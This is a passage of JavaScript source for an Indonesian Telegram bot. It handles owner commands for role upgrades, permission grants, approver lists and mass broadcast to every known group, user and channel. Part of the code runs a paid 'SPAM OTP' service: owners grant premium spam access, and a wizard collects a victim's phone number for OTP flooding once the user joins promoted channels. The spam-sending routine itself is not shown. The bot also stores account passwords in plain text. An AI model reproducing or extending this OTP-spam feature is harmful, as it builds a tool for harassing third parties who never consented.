        icon_custom_emoji_id: UPGRADE_EMOJI.user,
      }],
      [{ text: '🔙 KEMBALI KE USER', callback_data: 'upg_back_users', style: 'primary' }],
      [{ text: '❌ BATAL', callback_data: 'upg_cancel', style: 'danger' }],
    ],
  };
}

async function showUpgradeCurrentRole(chatId, messageId, userId, targetUser) {
  const currentRole = String(targetUser.role || 'member').toLowerCase();
  upgradeWizardState.set(userId, {
    step: 'SELECT_CURRENT_ROLE',
    targetIndex: targetUser.__dbIndex,
    targetUsername: targetUser.username,
    actualRole: currentRole,
  });

  const caption = [
    `<blockquote><b>${upgradeCe(UPGRADE_EMOJI.user, '👤')} TARGET SELECTED</b></blockquote>`,
    `<blockquote>👤 <b>Username</b> : <code>${escapeHtml(targetUser.username)}</code></blockquote>`,
    `<blockquote>🆔 <b>Telegram ID</b> : <code>${escapeHtml(String(targetUser.telegramId || '-'))}</code></blockquote>`,
    `<blockquote>👑 <b>Role Sekarang</b> : <b>${escapeHtml(upgradeRoleLabel(currentRole))}</b></blockquote>`,
    `<blockquote>📅 <b>Expired</b> : ${escapeHtml(String(targetUser.expiredDate || 'Tidak tersedia'))}</blockquote>`,
    '',
    `<blockquote><b>1️⃣ KONFIRMASI ROLE AWAL</b></blockquote>`,
    `<blockquote>Klik tombol role sekarang untuk melanjutkan ke pilihan <b>ROLE TARGET</b>.</blockquote>`,
  ].join('\n');

  await bot.editRichMessage(caption, {
    chat_id: chatId,
    message_id: messageId,
    parse_mode: 'HTML',
    reply_markup: upgradeCurrentRoleKeyboard(currentRole),
  });
}

async function showUpgradeTargetRoles(chatId, messageId, userId, state) {
  const db = loadDatabase();
  const targetUser = db[state.targetIndex];
  if (!targetUser || targetUser.username !== state.targetUsername) {
    upgradeWizardState.delete(userId);
    await bot.editRichMessage(
      `<blockquote><b>❌ TARGET TIDAK DITEMUKAN</b></blockquote>\n<blockquote>Data user berubah atau sudah tidak tersedia di database.</blockquote>`,
      { chat_id: chatId, message_id: messageId, parse_mode: 'HTML', reply_markup: { inline_keyboard: [] } }
    );
    return;
  }

  const actualRole = String(targetUser.role || 'member').toLowerCase();
  if (actualRole !== state.actualRole) {
    state.actualRole = actualRole;
    upgradeWizardState.set(userId, state);
  }

  const targetRoles = getUpgradeTargetRoles(actualRole);
  if (!targetRoles.length) {
    await bot.editRichMessage(
      upgradeRichPanel('⚠️ ROLE SUDAH DI LEVEL TERTINGGI', [
        ['👤 Username', `<code>${escapeHtml(targetUser.username)}</code>`],
        ['👑 Role', `<b>${escapeHtml(upgradeRoleLabel(actualRole))}</b>`],
        ['📈 Status', 'Tidak ada role yang lebih tinggi'],
      ], 'Pilih user lain untuk upgrade.'),
      { chat_id: chatId, message_id: messageId, parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '🔙 PILIH USER LAIN', callback_data: 'upg_back_users', style: 'primary' }], [{ text: '❌ BATAL', callback_data: 'upg_cancel', style: 'danger' }]] } }
    );
    return;
  }

  state.step = 'SELECT_TARGET_ROLE';
  state.actualRole = actualRole;
  upgradeWizardState.set(userId, state);

  const rows = [];
  for (let i = 0; i < targetRoles.length; i += 2) {
    const row = [upgradeRoleButton(targetRoles[i])];
    if (targetRoles[i + 1]) row.push(upgradeRoleButton(targetRoles[i + 1]));
    rows.push(row);
  }
  rows.push([{ text: '🔙 ROLE SEKARANG', callback_data: `upg_current_${actualRole}`, style: 'primary' }]);
  rows.push([{ text: '❌ BATAL', callback_data: 'upg_cancel', style: 'danger' }]);

  const caption = [
    `<blockquote><b>${upgradeCe(UPGRADE_EMOJI.crown, '👑')} TARGET ROLE UPGRADE</b></blockquote>`,
    `<blockquote>👤 <b>Username</b> : <code>${escapeHtml(targetUser.username)}</code></blockquote>`,
    `<blockquote>📌 <b>Role Sekarang</b> : <b>${escapeHtml(upgradeRoleLabel(actualRole))}</b></blockquote>`,
    `<blockquote>🚀 <b>Pilih role target</b> yang lebih tinggi untuk akun ini.</blockquote>`,
    `<blockquote>${upgradeCe(UPGRADE_EMOJI.shield, '🛡️')} Sistem akan melakukan validasi ulang sebelum database disimpan.</blockquote>`,
  ].join('\n');

  await bot.editRichMessage(caption, {
    chat_id: chatId,
    message_id: messageId,
    parse_mode: 'HTML',
    reply_markup: { inline_keyboard: rows },
  });
}

function saveDatabaseAtomicUpgrade(data) {
  const tempPath = `${DB_PATH}.upgrade.tmp`;
  fs.writeFileSync(tempPath, JSON.stringify(data, null, 2), 'utf8');
  fs.renameSync(tempPath, DB_PATH);
}

// ========== COMMAND: /upgrade (OWNER ONLY) ==========
bot.onText(/^\/upgrade$/i, async (msg) => {
  const chatId = msg.chat.id;
  const userId = Number(msg.from.id);

  if (!telegramIsOwner(userId)) {
    return bot.sendRichMessage(chatId, [
      `<blockquote><b>🚫 ${upgradeCe(UPGRADE_EMOJI.shield, 'ACCESS DENIED')}</b></blockquote>`,
      `<blockquote>Fitur <b>/upgrade</b> hanya dapat digunakan oleh <b>OWNER</b>.</blockquote>`,
      `<blockquote>🛡️ Request ditolak oleh security layer.</blockquote>`,
    ].join('\n'), { parse_mode: 'HTML' });
  }

  upgradeWizardState.delete(userId);
  return showUpgradeUserPage(chatId, null, userId, 1);
});

// ========== COMMAND: /addizin ==========
bot.onText(/^\/addizin$/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    // Cek apakah pengirim adalah owner (dari telegram.json)
    if (!telegramIsOwner(userId)) {
        return bot.sendRichMessage(chatId, `
❌ <b>Akses Ditolak</b>
Anda tidak memiliki izin untuk menggunakan perintah ini.
Hanya <b>OWNER</b> yang dapat mengakses.
        `, { parse_mode: "HTML" });
    }

    // Reset state jika ada
    addizinWizardState.delete(userId);

    // Buat tombol role (2 kolom)
    const rows = [];
    for (let i = 0; i < ADDIZIN_ROLES.length; i += 2) {
        const row = [];
        const role1 = ADDIZIN_ROLES[i];
        row.push({
            text: role1.toUpperCase(),
            callback_data: `addizin_role_${role1}`,
            style: role1 === 'owner_utama' ? 'danger' : 'primary'
        });
        if (i + 1 < ADDIZIN_ROLES.length) {
            const role2 = ADDIZIN_ROLES[i + 1];
            row.push({
                text: role2.toUpperCase(),
                callback_data: `addizin_role_${role2}`,
                style: role2 === 'owner_utama' ? 'danger' : 'primary'
            });
        }
        rows.push(row);
    }
    // Tombol batal
    rows.push([{ text: "❌ BATAL", callback_data: "addizin_cancel", style: "danger" }]);

    const keyboard = { inline_keyboard: rows };

    await bot.sendRichMessage(chatId, `
📌 <b>ADD IZIN / ACCESS ROLE</b>

Silakan pilih role yang ingin diberikan kepada user.
    `, { parse_mode: "HTML", reply_markup: keyboard });

    // Set state ke SELECTING_ROLE
    addizinWizardState.set(userId, { step: 'SELECTING_ROLE' });
});

// ========== COMMAND: /owneracc — MANAGE CREATE APPROVERS ==========
bot.onText(/^\/owneracc(?:\s+(add|remove|list)\s*(\d+)?)?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = Number(msg.from.id);

  if (!telegramIsOwner(userId)) {
    return bot.sendRichMessage(chatId, createAccountRich("OWNER ACC", [
      `${createUiEmoji(CREATE_UI_EMOJI.lock, '🔐')} Fitur ini <b>owner only</b>.`,
      `${createUiEmoji(CREATE_UI_EMOJI.shield, '🛡️')} Hanya owner utama yang dapat menambah atau menghapus approver.`
    ]), { parse_mode: 'HTML' });
  }

  const action = String(match?.[1] || 'list').toLowerCase();
  const targetId = match?.[2] ? Number(match[2]) : null;
  const cfg = loadTelegramConfig();
  cfg.createApproverList = Array.isArray(cfg.createApproverList) ? [...new Set(cfg.createApproverList.map(Number).filter(Number.isFinite))] : [];

  if (action === 'list') {
    const rows = cfg.createApproverList.length
      ? cfg.createApproverList.map((id, index) => `${index + 1}. <code>${id}</code>`).join('\n')
      : '<i>Belum ada approver tambahan.</i>';
    return bot.sendRichMessage(chatId, createAccountRich("OWNER ACC • APPROVER", [
      `${createUiEmoji(CREATE_UI_EMOJI.shield, '🛡️')} <b>Owner utama:</b> selalu bisa ACC.`,
      `${createUiEmoji(CREATE_UI_EMOJI.user, '👤')} <b>Approver tambahan:</b>`,
      rows,
      '',
      `<code>/owneracc add 123456789</code>`,
      `<code>/owneracc remove 123456789</code>`
    ]), { parse_mode: 'HTML' });
  }

  if (!targetId || targetId <= 0) {
    return bot.sendRichMessage(chatId, createErrorPanel('Format: /owneracc add 123456789 atau /owneracc remove 123456789'), { parse_mode: 'HTML' });
  }

  if (action === 'add') {
    if (!cfg.createApproverList.includes(targetId)) cfg.createApproverList.push(targetId);
    saveTelegramConfig(cfg);
    return bot.sendRichMessage(chatId, createAccountRich("APPROVER DITAMBAHKAN", [
      `${createUiEmoji(CREATE_UI_EMOJI.check, '✅')} Telegram ID <code>${targetId}</code> sekarang dapat <b>ACC CREATE</b>.`,
      `${createUiEmoji(CREATE_UI_EMOJI.lock, '🔐')} Hak owner utama tetap tidak berubah.`
    ]), { parse_mode: 'HTML' });
  }

  if (action === 'remove') {
    cfg.createApproverList = cfg.createApproverList.filter(id => id !== targetId);
    saveTelegramConfig(cfg);
    return bot.sendRichMessage(chatId, createAccountRich("APPROVER DIHAPUS", [
      `${createUiEmoji(CREATE_UI_EMOJI.check, '✅')} Telegram ID <code>${targetId}</code> tidak lagi dapat ACC CREATE.`
    ]), { parse_mode: 'HTML' });
  }

  return bot.sendRichMessage(chatId, createErrorPanel('Gunakan /owneracc add|remove|list.'), { parse_mode: 'HTML' });
});

// ========== COMMAND: /addowner (tambahkan owner ID) ==========
bot.onText(/^\/addowner$/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    // Cek apakah pengirim adalah owner yang sudah terdaftar
    if (!telegramIsOwner(userId)) {
        return bot.sendRichMessage(chatId, `
❌ <b>Akses Ditolak</b>
Anda tidak memiliki izin untuk menggunakan perintah ini.
Hanya <b>OWNER</b> yang dapat mengakses.
        `, { parse_mode: "HTML" });
    }

    // Kirim instruksi dan set state
    const keyboard = {
        inline_keyboard: [
            [{ text: "❌ BATAL", callback_data: "cancel_addowner", style: "danger" }]
        ]
    };

    await bot.sendRichMessage(chatId, `
📌 <b>TAMBAH OWNER ID</b>

Kirimkan <b>Telegram ID</b> (angka) dari user yang ingin Anda jadikan owner.

Contoh: <code>123456789</code>

Ketik /batal untuk membatalkan.
    `, { parse_mode: "HTML", reply_markup: keyboard });

    // Set state ke add_owner (sudah ada handler di bot.on('message'))
    pendingTelegramInput.set(userId, { type: "add_owner" });
});

// ========== COMMAND: /broadcast (OWNER ONLY) ==========
bot.onText(/^\/broadcast$/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    if (!telegramIsOwner(userId)) {
        return bot.sendRichMessage(chatId, `
❌ <b>Akses Ditolak</b>
Anda tidak memiliki izin untuk menggunakan perintah ini.
Hanya <b>OWNER</b> yang dapat mengakses.
        `, { parse_mode: "HTML" });
    }

    // Reset state jika ada
    pendingBroadcast.delete(userId);

    const keyboard = {
        inline_keyboard: [
            [
                { text: "📢 BC GROUP", callback_data: "bc_group", style: "primary" },
                { text: "👤 BC USER", callback_data: "bc_user", style: "primary" }
            ],
            [
                { text: "📣 BC CHANNEL", callback_data: "bc_channel", style: "primary" },
                { text: "🌍 BC ALL", callback_data: "bc_all", style: "success" }
            ],
            [
                { text: "❌ BATAL", callback_data: "bc_cancel", style: "danger" }
            ]
        ]
    };

    await bot.sendRichMessage(chatId, `
📢 <b>BROADCAST</b>

Pilih target broadcast:

📢 <b>BC GROUP</b> – Kirim ke semua grup
👤 <b>BC USER</b> – Kirim ke semua user (private)
📣 <b>BC CHANNEL</b> – Kirim ke semua channel
🌍 <b>BC ALL</b> – Kirim ke semua (grup+user+channel)

Kemudian kirimkan pesan yang ingin disebarkan.
    `, { parse_mode: "HTML", reply_markup: keyboard });
});

// ========== COMMAND: /addpremSpam (owner only) ==========
bot.onText(/^\/addpremSpam\s+(\d+)$/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const targetId = parseInt(match[1]);

    if (!telegramIsOwner(userId)) {
        return bot.sendRichMessage(chatId, `
❌ <b>Akses Ditolak</b>
Hanya owner yang bisa menambahkan premium spam.
        `, { parse_mode: "HTML" });
    }

    if (addPremiumSpamUser(targetId)) {
        await bot.sendRichMessage(chatId, `
✅ <b>Premium Spam Added</b>
User dengan ID <code>${targetId}</code> sekarang memiliki akses SPAM OTP.
        `, { parse_mode: "HTML" });
        try {
            await bot.sendRichMessage(targetId, `
🎉 <b>Selamat!</b>
Anda sekarang memiliki akses <b>SPAM OTP</b> premium.
Gunakan menu utama untuk memulai.
            `, { parse_mode: "HTML" });
        } catch (_) {}
    } else {
        await bot.sendRichMessage(chatId, `
⚠️ User ID <code>${targetId}</code> sudah memiliki akses premium.
        `, { parse_mode: "HTML" });
    }
});

bot.onText(/^\/removepremSpam\s+(\d+)$/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const targetId = parseInt(match[1]);

    if (!telegramIsOwner(userId)) {
        return bot.sendRichMessage(chatId, `
❌ <b>Akses Ditolak</b>
Hanya owner yang bisa menghapus premium spam.
        `, { parse_mode: "HTML" });
    }

    if (removePremiumSpamUser(targetId)) {
        await bot.sendRichMessage(chatId, `
✅ <b>Premium Spam Removed</b>
User dengan ID <code>${targetId}</code> tidak lagi memiliki akses SPAM OTP.
        `, { parse_mode: "HTML" });
    } else {
        await bot.sendRichMessage(chatId, `
⚠️ User ID <code>${targetId}</code> tidak ditemukan dalam daftar premium.
        `, { parse_mode: "HTML" });
    }
});

bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  const id = msg.from && msg.from.id;
  if (!id) return;

  // ══════════════════════════════════════════════════════════════
  // 🆕 SERVICES DP HANDLER (PRIORITAS UTAMA)
  // Intercept foto bukti transfer DP sebelum masuk flow lain
  // ══════════════════════════════════════════════════════════════
  try {
    const handledBySvc = await getServicesDP()?.handleMessage(msg);
    if (handledBySvc) return;
  } catch (e) {
    console.error('[SVC HANDLE MESSAGE]', e.message);
  }
  
  // ══════════════════════════════════════════════════════════════
// 🆕 SETORAN HANDLER
// ══════════════════════════════════════════════════════════════
try {
  const handledByStn = await getSetoran()?.handleMessage(msg);
  if (handledByStn) return;
} catch (e) {
  console.error('[STN HANDLE MESSAGE]', e.message);
}

  // ─── REKAM CHAT ID UNTUK BROADCAST ──────────────────────────────
  const chat = msg.chat;
  if (chat) {
    let type = chat.type;
    if (type === 'supergroup' || type === 'group') type = 'group';
    else if (type === 'private') type = 'user';
    else if (type === 'channel') type = 'channel';
    else type = 'unknown';
    if (type !== 'unknown') {
      addBroadcastTarget(chat.id, type);
    }
  }

  // ─── HANDLE CANCEL BROADCAST VIA /batal ─────────────────────────
  if (msg.text && /^\/batal$/i.test(msg.text)) {
    const bcState = pendingBroadcast.get(Number(id));
    if (bcState) {
      pendingBroadcast.delete(Number(id));
      await bot.sendRichMessage(chatId, '❌ Broadcast dibatalkan.', { parse_mode: "HTML" });
      return;
    }
  }

  // ========== UPDATE HANDLER BROADCAST DI bot.on('message') ==========
// Cari bagian ini di dalam bot.on('message') dan ganti dengan yang baru:

// ─── HANDLE INPUT PESAN UNTUK BROADCAST (WAITING_CONTENT) ──────
const bcState = pendingBroadcast.get(Number(id));
if (bcState && bcState.step === 'waiting_content' && !/^\/?(start|menu|addizin|addowner|broadcast|batal)/i.test(msg.text || '')) {
    let content = null;
    let contentType = '';

    // Cek jenis konten
    if (msg.text) {
        contentType = 'text';
        content = { text: msg.text.trim() };
    } else if (msg.photo) {
        contentType = 'photo';
        const photo = msg.photo[msg.photo.length - 1];
        content = { fileId: photo.file_id, caption: msg.caption || '' };
    } else if (msg.video) {
        contentType = 'video';
        const video = msg.video;
        content = { fileId: video.file_id, caption: msg.caption || '' };
    } else if (msg.document) {
        // Bisa tambahkan document jika diperlukan
        return bot.sendRichMessage(chatId, '❌ Format file tidak didukung. Kirim teks, foto, atau video.', { parse_mode: "HTML" });
    } else {
        return bot.sendRichMessage(chatId, '❌ Kirimkan teks, foto, atau video untuk broadcast.', { parse_mode: "HTML" });
    }

    // Simpan konten ke state
    bcState.content = content;
    bcState.contentType = contentType;
    bcState.step = 'preview';
    pendingBroadcast.set(Number(id), bcState);

    // Buat preview
    let previewText = `
📝 <b>PREVIEW BROADCAST</b>

🎯 <b>Target:</b> ${bcState.targetType.toUpperCase()}
📎 <b>Tipe:</b> ${contentType.toUpperCase()}
`;

    if (contentType === 'text') {
        previewText += `\n📨 <b>Pesan:</b>\n${content.text}`;
    } else if (contentType === 'photo') {
        previewText += `\n🖼️ <b>Foto:</b> (dengan caption: ${content.caption || 'tanpa caption'})`;
    } else if (contentType === 'video') {
        previewText += `\n🎬 <b>Video:</b> (dengan caption: ${content.caption || 'tanpa caption'})`;
    }

    previewText += `

Apakah Anda yakin ingin mengirim broadcast ini?
`;

    const keyboard = {
        inline_keyboard: [
            [
                { text: "✅ LANJUTKAN", callback_data: "bc_confirm", style: "success" },
                { text: "❌ BATAL", callback_data: "bc_cancel", style: "danger" }
            ]
        ]
    };

    // Kirim preview (bisa dengan media jika foto/video)
    let sentMsg;
    if (contentType === 'text') {
        sentMsg = await bot.sendRichMessage(chatId, previewText, {
            parse_mode: "HTML",
            reply_markup: keyboard
        });
    } else if (contentType === 'photo') {
        sentMsg = await bot.sendRichMessage({
            type: "photo",
            chatId: chatId,
            media: content.fileId,
            options: {
                caption: previewText,
                parse_mode: "HTML",
                reply_markup: keyboard
            }
        });
    } else if (contentType === 'video') {
        sentMsg = await bot.sendRichMessage({
            type: "video",
            chatId: chatId,
            media: content.fileId,
            options: {
                caption: previewText,
                parse_mode: "HTML",
                reply_markup: keyboard
            }
        });
    }

    // Simpan messageId preview untuk diedit nanti
    if (sentMsg && sentMsg.message_id) {
        bcState.previewMessageId = sentMsg.message_id;
        pendingBroadcast.set(Number(id), bcState);
    }

    return;
}

  // ============================================================
  // 📝 HANDLE INPUT TARGET UNTUK ADDIZIN (WAITING_TARGET)
  // ============================================================
  const addizinState = addizinWizardState.get(Number(id));
  if (addizinState && addizinState.step === 'WAITING_TARGET' && msg.text && !/^\/?(start|menu|addizin|create|buatakun)\b/i.test(msg.text)) {
    const input = msg.text.trim();
    const selectedRole = addizinState.selectedRole;
    let targetId = null;
    let targetUsername = null;

    if (/^\d+$/.test(input)) {
      targetId = parseInt(input);
      try {
        const chat = await bot.getChat(targetId);
        targetUsername = chat.username || chat.first_name || `User_${targetId}`;
      } catch {
        targetUsername = `User_${targetId}`;
      }
    } else {
      let username = input;
      if (username.startsWith('@')) username = username.slice(1);
      targetUsername = username;
      try {
        const chat = await bot.getChat(`@${username}`);
        targetId = chat.id;
      } catch {
        targetId = null;
      }
    }

    if (!targetId) {
      const users = loadAddizinUsers();
      const existing = users.find(u => u.username.toLowerCase() === targetUsername.toLowerCase());
      if (existing) {
        targetId = existing.telegramId;
      } else {
        targetId = 0;
      }
    }

    const ownerUsername = msg.from.username || msg.from.first_name || `Owner_${id}`;
    const success = addAddizinUser(targetId, targetUsername, selectedRole, ownerUsername);

    addizinWizardState.delete(Number(id));

    const instMsgId = addizinState.instructionMessageId;
    if (instMsgId) {
      await bot.deleteMessage(chatId, instMsgId).catch(() => {});
    }

    if (success) {
      const logMessage = `
<blockquote>✅ <b>ADD IZIN BERHASIL</b></blockquote>

━━━━━━━━━━━━━━━━━━
👤 <b>User:</b> ${targetUsername}
🆔 <b>Telegram ID:</b> ${targetId || 'Tidak ditemukan'}
👑 <b>Role:</b> <b>${selectedRole.toUpperCase()}</b>
🛡 <b>Ditambahkan oleh:</b> ${ownerUsername}
🕒 <b>Waktu:</b> ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
━━━━━━━━━━━━━━━━━━

<blockquote>📌 <b>Status</b></blockquote>
User berhasil diberikan akses dengan role <b>${selectedRole.toUpperCase()}</b>.
      `;

      const keyboard = {
        inline_keyboard: [
          [{ text: "👤 CEK PROFILE", callback_data: `addizin_profile_${targetId}`, style: "primary" }],
          [{ text: "📋 MENU UTAMA", callback_data: "mainmenu", style: "primary" }]
        ]
      };

      await bot.sendRichMessage(chatId, logMessage, {
        parse_mode: "HTML",
        reply_markup: keyboard
      });

      if (targetId && targetId > 0) {
        try {
          await bot.sendRichMessage(targetId, `
🎉 <b>Selamat! Anda telah diberikan akses!</b>

Anda sekarang memiliki role <b>${selectedRole.toUpperCase()}</b> di Mclaren Project.

Silakan gunakan perintah <code>/menu</code> untuk mulai.
          `, { parse_mode: "HTML" });
        } catch (err) {
          console.log(`[ADDIZIN] Gagal kirim notifikasi ke user ${targetId}:`, err.message);
        }
      }

      console.log(`[ADDIZIN] ${ownerUsername} menambahkan ${targetUsername} dengan role ${selectedRole}`);

    } else {
      await bot.sendRichMessage(chatId, `
❌ <b>Gagal menyimpan data.</b>
Silakan coba lagi atau hubungi admin.
      `, { parse_mode: "HTML" });
    }

    return;
  }

  // ─── HANDLE INPUT NOMOR UNTUK SPAM OTP ──────────────────────────
  const spamState = spamWizardState.get(Number(id));
  if (spamState && spamState.step === 'waiting_number' && msg.text && !/^\/?(start|menu|addizin|addowner|broadcast|batal)/i.test(msg.text)) {
      const input = msg.text.trim();
      if (!input.startsWith('+')) {
          return bot.sendRichMessage(chatId, `
❌ <b>Format salah!</b>
Nomor harus diawali dengan <b>+</b>.
Contoh: <code>+6281234567890</code>
          `, { parse_mode: "HTML" });
      }

      const cleanNumber = input.replace(/[^0-9+]/g, '');
      if (!/^\+\d{8,15}$/.test(cleanNumber)) {
          return bot.sendRichMessage(chatId, `
❌ <b>Nomor tidak valid!</b>
Pastikan formatnya <b>+628xxxxxxxxx</b> (8-15 digit).
          `, { parse_mode: "HTML" });
      }

      spamState.phone = cleanNumber;
      spamState.step = 'waiting_join';
      spamWizardState.set(Number(id), spamState);

      const keyboard = {
          inline_keyboard: [
              [
                  { text: "📢 JOIN CHANNEL 1", url: getChannelUrl(CHANNEL_1) },
                  { text: "📢 JOIN CHANNEL 2", url: getChannelUrl(CHANNEL_2) }
              ],
              [
                  { text: "✅ CEK JOIN", callback_data: "spam_check_join", style: "success" },
                  { text: "❌ BATAL", callback_data: "spam_cancel", style: "danger" }
              ]
          ]
      };

      await bot.sendRichMessage(chatId, `
🔐 <b>WAJIB JOIN CHANNEL</b>

Nomor target: <b>${cleanNumber}</b>

Untuk melanjutkan spam OTP, Anda harus join:
1️⃣ ${CHANNEL_1}
2️⃣ ${CHANNEL_2}

Klik tombol di bawah untuk join, lalu tekan <b>CEK JOIN</b>.
      `, {
          parse_mode: "HTML",
          reply_markup: keyboard
      });

      return;
  }

  // ============================================================
  // HANDLER UNTUK PENDING INPUT (create account, dll.)
  // ============================================================
  const pending = pendingTelegramInput.get(Number(id));
  if (pending && msg.text && !/^\/?(start|menu|create|buatakun)\b/i.test(msg.text)) {
    try {
      const text = msg.text.trim();

      // ─── CREATE ACCOUNT ROUTER GUARD ─────────────────────────────
      // Raw text tidak pernah membuat akun secara langsung. Semua create masuk
      // ke request flow dan finalisasi hanya lewat approval callback.
      if (pending.type === "create_account") {
        pendingTelegramInput.delete(Number(id));
        return bot.sendRichMessage(id, createAccountRich("PILIH METODE CREATE", [
          `${createUiEmoji(CREATE_UI_EMOJI.shield, '🛡️')} <b>Create dibuka untuk semua user.</b>`,
          `${createUiEmoji(CREATE_UI_EMOJI.check, '✅')} Akun baru hanya dibuat setelah <b>approval</b>.`,
          `${createUiEmoji(CREATE_UI_EMOJI.lock, '🔐')} Hanya owner / approver yang terdaftar yang dapat ACC.`
        ]), { parse_mode: "HTML", reply_markup: { inline_keyboard: [
          [{ text: '📝 MANUAL', callback_data: 'create_method_manual', style: 'primary', icon_custom_emoji_id: CREATE_UI_EMOJI.user },
           { text: '⚡ OTOMATIS', callback_data: 'create_method_auto', style: 'success', icon_custom_emoji_id: CREATE_UI_EMOJI.rocket }],
          [{ text: '❌ BATAL', callback_data: 'cancel_create', style: 'danger', icon_custom_emoji_id: CREATE_UI_EMOJI.lock }]
        ] }});
      }

      // ─── CREATE FREE ────────────────────────────────────────────────
      if (pending.type === "create_free") {
        const normalized = /^\/createfree\b/i.test(text)
          ? text.replace(/^\/createfree\b/i, "").trim().split(/\s+/).join("|")
          : text;
        const [username, password] = normalized.split("|").map(v => v.trim());

        if (!username || !password) {
          return bot.sendRichMessage(id, panelForAction(
            "📝 CREATE FREE - FORMAT",
            [
              ["📌 Format", "username | password"],
              ["⏳ Durasi", "5 HARI"],
              ["💡 Contoh", "trial123 | Pass123"],
              ["📖 Info", "Join both channels first!"]
            ],
            "Kirim dengan format: <code>username | password</code>"
          ), { parse_mode: "HTML" });
        }

        const join = await checkJoinedChannels(id);
        if (!join.configured) {
          return bot.sendRichMessage(id, createSimplePanel(
            "⚠️ Channel belum dikonfigurasi.\n\nSilakan hubungi admin untuk info lebih lanjut."
          ), { parse_mode: "HTML" });
        }
        if (!join.ok) {
          return sendJoinGate(id, true);
        }

        const db = loadDatabase();
        if (db.some(u => String(u.username).toLowerCase() === username.toLowerCase())) {
          return bot.sendRichMessage(id, createErrorPanel(
            "❌ Username <b>" + escapeHtml(username) + "</b> sudah digunakan.\n\n💡 Silakan pilih username lain."
          ), { parse_mode: "HTML" });
        }

        const expired = new Date();
        expired.setDate(expired.getDate() + FREE_DURATION_DAYS);
        const expiredDate = expired.toISOString().slice(0, 10);

        db.push({
          username,
          password,
          role: "member",
          expiredDate: expiredDate,
          freeAccount: true,
          createdByTelegram: Number(id),
          createdAt: new Date().toISOString()
        });
        saveDatabase(db);
        pendingTelegramInput.delete(Number(id));

        return bot.sendRichMessage(id, createSuccessPanel(
          "🎉 CREATE FREE BERHASIL",
          [
            ["👤 Username", username.slice(0, 3) + "**"],
            ["🔑 Password", "******"],
            ["👑 Role", "member"],
            ["⏳ Masa aktif", "5 hari"],
            ["📅 Expired", expiredDate],
            ["📌 Status", "✅ AKTIF"]
          ]
        ), { parse_mode: "HTML" })
      }
      
      // ─── CEK BANNED VIP ──────────────────────────────────────────────────
const bannedState = bannedWizardState.get(Number(id));
if (bannedState && bannedState.step === 'waiting_number' && msg.text && !/^\/?(start|menu|addizin|addowner|broadcast|batal)/i.test(msg.text)) {
  const raw = msg.text.trim();
  // Bersihkan: hanya angka dan +
  let phone = raw.replace(/[^\d+]/g, '');
  // Validasi: harus punya angka minimal 10
  const digits = phone.replace(/\D/g, '');
  if (digits.length < 10) {
    return bot.sendRichMessage(chatId, createErrorPanel("❌ Nomor terlalu pendek. Minimal 10 digit setelah kode negara."), { parse_mode: "HTML" });
  }

  // Update state
  bannedState.phone = phone;
  bannedState.step = 'processing';
  bannedWizardState.set(Number(id), bannedState);

  // Mulai proses pengecekan dengan loading
  await processBannedCheck(chatId, bannedState.messageId, phone, Number(id));
  return;
}

      // ─── DELETE USER ──────────────────────────────────────────────
      if (pending.type === "delete_user") {
        if (!telegramIsOwner(id)) return bot.sendRichMessage(id, createErrorPanel(" Khusus owner."), { parse_mode: "HTML" });
        const db = loadDatabase();
        const index = db.findIndex(u => String(u.username).toLowerCase() === text.toLowerCase());
        if (index === -1) return bot.sendRichMessage(id, createErrorPanel(" User tidak ditemukan."), { parse_mode: "HTML" });
        const deleted = db.splice(index, 1)[0];
        saveDatabase(db);
        pendingTelegramInput.delete(Number(id));
        return bot.sendRichMessage(id, panelForAction("HAPUS AKUN BERHASIL", [["Username", deleted.username], ["Status", "DIHAPUS"]]), { parse_mode: "HTML" });
      }

      // ─── ADD OWNER ──────────────────────────────────────────────────
      if (pending.type === "add_owner") {
        if (!telegramIsOwner(id)) return bot.sendRichMessage(id, createErrorPanel(" Khusus owner utama."), { parse_mode: "HTML" });
        const ownerId = Number(text.replace(/\D/g, ""));
        if (!ownerId) return bot.sendRichMessage(id, createErrorPanel(" Masukkan Telegram ID angka yang valid."), { parse_mode: "HTML" });
        const cfg = loadTelegramConfig();
        cfg.ownerList = Array.isArray(cfg.ownerList) ? cfg.ownerList : [];
        if (!cfg.ownerList.includes(ownerId)) cfg.ownerList.push(ownerId);
        saveTelegramConfig(cfg);
        pendingTelegramInput.delete(Number(id));
        return bot.sendRichMessage(id, createSuccessPanel("ADD OWNER", [["Telegram ID", String(ownerId)], ["Status", "BERHASIL"]]), { parse_mode: "HTML" });
      }

      // ─── REMOVE OWNER ──────────────────────────────────────────────
      if (pending.type === "remove_owner") {
        if (!telegramIsOwner(id)) return bot.sendRichMessage(id, createErrorPanel(" Khusus owner utama."), { parse_mode: "HTML" });
        const ownerId = Number(text.replace(/\D/g, ""));
        const cfg = loadTelegramConfig();
        cfg.ownerList = Array.isArray(cfg.ownerList) ? cfg.ownerList : [];
        const index = cfg.ownerList.indexOf(ownerId);
        if (index === -1) return bot.sendRichMessage(id, createErrorPanel(" ID tersebut bukan owner."), { parse_mode: "HTML" });
        cfg.ownerList.splice(index, 1);
        saveTelegramConfig(cfg);
        pendingTelegramInput.delete(Number(id));
        return bot.sendRichMessage(id, createSuccessPanel("REMOVE OWNER", [["Telegram ID", String(ownerId)], ["Status", "DIHAPUS"]]), { parse_mode: "HTML" });
      }

      // ─── HANDLE INPUT MANUAL CREATE ──────────────────────────────
      if (pending.type === "create_account_manual") {
        const parts = text.split("|").map(v => v.trim());
        if (parts.length !== 4) {
          return bot.sendRichMessage(chatId, `
❌ Format salah! Gunakan format:
<code>username | password | role | durasi_hari</code>

Contoh: <code>satoshi | xxo | vip | 99</code>
          `.trim(), { parse_mode: "HTML" });
        }

        const [username, password, role, dayRaw] = parts;
        const day = Number(dayRaw);

        if (!username || !password || !ROLE_NAMES.includes(role) || !Number.isInteger(day) || day <= 0 || day > 36500) {
          return bot.sendRichMessage(chatId, `
❌ Data tidak valid. Periksa kembali:
- Username tidak boleh kosong
